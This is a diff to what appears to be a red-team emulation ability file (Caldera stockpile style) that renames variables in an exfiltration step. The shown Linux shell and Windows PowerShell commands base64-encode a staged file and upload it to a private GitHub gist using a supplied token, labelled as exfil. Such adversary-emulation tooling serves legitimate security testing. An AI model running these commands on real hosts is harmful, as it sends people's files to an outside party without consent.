@@ -13,10 +13,10 @@
     linux:
       sh:
         command: | # Temporary file needed to avoid curl length restrictions
-          GHUser="#{github.user.name}";
-          GHPAT="#{github.access.token}";
-          FileContent=$(base64 #{host.dir.compress});
-          LocalFile='#{host.dir.compress}';
+          GHUser="#{custom.github_username}";
+          GHPAT="#{custom.github_token}";
+          FileContent=$(base64 #{file.staged_at});
+          LocalFile='#{file.staged_at}';
           RemoteFile="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
           tmp_file=$(mktemp);
           echo "{\"public\": false,\"files\": {\"$RemoteFile\": {\"content\": \"${FileContent}\"}}}" > $tmp_file;
@@ -25,9 +25,9 @@
     windows:
       psh:
         command: |
-          $GHUser = "#{github.user.name}";
-          $GHPAT = "#{github.access.token}";
-          $File = Get-Item -Path "#{host.dir.compress}";
+          $GHUser = "#{custom.github_username}";
+          $GHPAT = "#{custom.github_token}";
+          $File = Get-Item -Path "#{file.staged_at}";
           $Token = $GHUser + ":" + $GHPAT;
           $EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);
 
@@ -47,4 +47,7 @@
           Invoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-        - source: host.dir.compress
+      - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+        - source: file.staged_at
+          edge: is_compressed
